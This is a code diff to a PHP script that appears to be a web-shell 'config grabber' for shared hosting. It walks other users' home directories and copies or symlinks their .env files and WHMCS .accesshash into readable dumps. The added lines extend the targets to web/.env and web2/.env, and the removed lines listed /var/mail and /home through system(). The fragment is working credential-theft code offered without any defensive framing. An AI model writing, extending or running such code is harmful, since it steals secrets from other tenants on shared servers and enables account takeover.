@@ -27,6 +27,10 @@ if (isset($_POST["conf"])) {
         symlink("/" . $home . "/" . $user . "/laravel/.env", $user . "  ENV");
         copy("/" . $home . "/" . $user . "/backend/.env", $user . "  ENV");
         symlink("/" . $home . "/" . $user . "/backend/.env", $user . "  ENV");
+        copy("/" . $home . "/" . $user . "/web/.env", $user . "  ENV");
+        symlink("/" . $home . "/" . $user . "/web/.env", $user . "  ENV");
+        copy("/" . $home . "/" . $user . "/web2/.env", $user . "  ENV");
+        symlink("/" . $home . "/" . $user . "/web2/.env", $user . "  ENV");
         copy("/" . $home . "/" . $user . "/.accesshash", $user . "WHMCS.txt");
         symlink("/" . $home . "/" . $user . "/.accesshash", $user . "WHMCS.txt");
         copy("/" . $home . "/" . $user . "/public_html/suspended.page/index.html", $user . "  RESELLER.txt");
@@ -469,8 +473,6 @@ foreach ($uSr as $usrr) {
     $str = explode(":", $usrr);
     echo $str[0] . "\n";
 }
-echo system("ls /var/mail");
-echo system("ls /home");
 ?>
                                                                         </textarea><br>
                                                                                 Home :
